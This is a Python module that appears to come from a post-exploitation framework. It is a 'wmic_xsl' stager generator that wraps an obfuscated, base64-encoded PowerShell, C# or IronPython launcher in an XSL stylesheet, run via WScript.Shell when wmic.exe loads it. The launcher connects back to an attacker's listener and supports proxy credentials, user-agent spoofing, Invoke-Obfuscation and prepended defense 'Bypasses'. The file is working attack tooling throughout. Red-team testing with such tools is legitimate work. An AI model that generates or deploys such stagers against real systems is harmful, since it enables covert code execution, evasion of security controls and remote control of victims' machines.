import logging

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "wmic_xsl",
            "Authors": [
                {
                    "Name": "",
                    "Handle": "@subTee",
                    "Link": "",
                },
                {
                    "Name": "Matt Graeber",
                    "Handle": "@mattifestation",
                    "Link": "https://twitter.com/mattifestation",
                },
            ],
            "Description": "Generates an XSL stylesheets file to be run with wmic.exe. Example: wmic process list /FORMAT:evil.xsl",
            "Comments": [],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                "Strict": True,
            },
            "StagerRetries": {
                "Description": "Times for the stager to retry connecting.",
                "Required": False,
                "Value": "0",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output, otherwise returned as a string.",
                "Required": False,
                "Value": "launcher.xsl",
            },
            "Base64": {
                "Description": "Base64 encode the output.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "Obfuscate": {
                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1,Launcher\STDIN++\12467",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        base64 = self.options["Base64"]["Value"]
        obfuscate = self.options["Obfuscate"]["Value"]
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        stager_retries = self.options["StagerRetries"]["Value"]

        encode = False
        if base64.lower() == "true":
            encode = True

        obfuscate_script = False
        if obfuscate.lower() == "true":
            obfuscate_script = True

        if language in ["csharp", "ironpython"]:
            if (
                self.mainMenu.listenersv2.get_active_listener_by_name(
                    listener_name
                ).info["Name"]
                != "HTTP[S]"
            ):
                log.error(
                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
                )
                return ""

            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner(
                language=language,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                encode=encode,
                listener_name=listener_name,
            )
        elif language == "powershell":
            launcher = self.mainMenu.stagergenv2.generate_launcher(
                listener_name,
                language=language,
                encode=encode,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                stager_retries=stager_retries,
                bypasses=self.options["Bypasses"]["Value"],
            )

        if launcher == "":
            log.error("[!] Error in launcher command generation.")
            return ""

        code = '<?xml version="1.0"?><stylesheet\n'
        code += 'xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"\n'
        code += 'xmlns:user="placeholder"\n'
        code += 'version="1.0">\n'
        code += '<output method="text"/><ms:script implements-prefix="user" language="JScript">'
        code += '<![CDATA[var r = new ActiveXObject("WScript.Shell").Run("'
        code += launcher
        code += '");]]></ms:script></stylesheet>'
        return code
